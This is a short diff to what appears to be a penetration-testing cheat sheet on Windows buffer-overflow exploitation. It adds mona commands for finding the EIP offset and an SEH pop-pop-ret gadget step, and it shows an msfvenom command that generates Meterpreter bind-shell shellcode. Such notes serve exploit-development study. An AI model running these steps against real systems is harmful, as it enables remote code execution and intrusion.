@@ -93,8 +93,13 @@
     ##### 5.4.2 Identify Offset to EIP 
         msf-pattern_create -l 4000 ==> Find content of EIP
         msf-pattern_offset -l 4000 -q 386F4337
+
+        !mona pattern_create 725
+        !mona pattern_offset 34684133
+
     ##### 5.4.3 Find JMP address
-        !mona jmp -r esp 
+        !mona jmp -r esp           -- For stack BOF
+        !seh -- pop,pop,ret gadget -- For SEH BOF
     ##### 5.4.3 Generate shell
         msfvenom -p windows/meterpreter/bind_tcp RHOST=0.0.0.0 LPORT=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f python -v shellcode
 
